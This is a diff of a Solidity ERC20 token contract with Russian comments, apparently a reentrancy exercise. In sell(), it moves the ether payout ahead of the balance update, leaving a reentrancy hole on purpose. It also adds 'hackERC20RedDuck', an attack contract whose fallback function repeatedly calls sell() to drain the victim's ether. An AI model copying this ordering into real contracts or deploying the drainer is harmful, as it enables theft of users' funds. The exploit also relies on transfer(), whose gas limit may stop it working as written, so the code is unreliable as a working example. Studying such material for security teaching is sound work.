@@ -31,11 +31,8 @@ contract erc20RedDuck is ERC20Interface {
 
     /*
      базовый конструктор erc20
-
      */
     constructor(uint8 decimals_, uint totalSupply_, uint coin_price_, uint16 voting_duration_) {
-        name = "Oleksiirium";
-        symbol = "Olx";
         decimals = decimals_;
         _totalSupply = totalSupply_;
         coin_price = coin_price_;
@@ -179,15 +176,38 @@ contract erc20RedDuck is ERC20Interface {
     
     function sell(uint256 _amount) external {
         require(_amount <= balances[msg.sender], "You don`t have this count of tokens"); 
-
+        payable(msg.sender).transfer(_amount / coin_price); //отправляем эфир по текущему курсу
         balances[msg.sender] = balances[msg.sender].sub(_amount); // отнимаем с аккаунта олексириум, который продаёт пользователь
-        balances[address(this)] = balances[address(this)].sub(_amount); //добавляем олексириум нам
+        balances[address(this)] = balances[address(this)].add(_amount); //добавляем олексириум нам
 
         emit Transfer(msg.sender, address(this), _amount); //такие штуки надо записывать в блокчейн
         
-        payable(msg.sender).transfer(_amount / coin_price); //отправляем эфир по текущему курсу
+
     }
 
+}
 
+contract hackERC20RedDuck {
+    erc20RedDuck public victim;
 
+    constructor(address victimAddress) {
+        victim = erc20RedDuck(victimAddress);
+    }
+
+    // Fallback - тип функции, который всегда отвечает на входящие транзакции
+    fallback() external payable {
+        if (address(victim).balance >= 1 ether) {
+            victim.sell(1);
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, 'MSG.Value is lower than 1 ether');
+        victim.buy{value: 1 ether}();
+        victim.sell(1);
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
 }
